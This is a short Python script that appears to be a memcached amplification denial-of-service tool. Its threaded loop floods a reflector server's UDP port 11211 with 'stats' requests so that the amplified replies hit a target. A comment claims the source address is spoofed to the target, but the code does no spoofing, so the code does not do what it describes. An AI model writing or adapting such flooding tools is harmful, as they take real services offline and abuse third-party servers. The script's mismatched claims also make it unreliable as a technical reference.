import socket
import threading

class MemcachedAttack:
    def __init__(self, target_ip, reflector_ip):
        self.target_ip = target_ip
        self.reflector_ip = reflector_ip
        self.running = False
        self.threads = []

    def memcached_amp(self):
        """Send amplified memcached responses to target"""
        payload = b"\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"
        
        while self.running:
            try:
                # Spoof source IP to be the target
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.bind(('0.0.0.0', 0))
                s.sendto(payload, (self.reflector_ip, 11211))
                s.close()
            except:
                pass

    def start(self, threads=10):
        """Start memcached amplification attack"""
        self.running = True
        for _ in range(threads):
            t = threading.Thread(target=self.memcached_amp)
            t.daemon = True
            t.start()
            self.threads.append(t)

    def stop(self):
        """Stop memcached amplification attack"""
        self.running = False
        for t in self.threads:
            t.join()
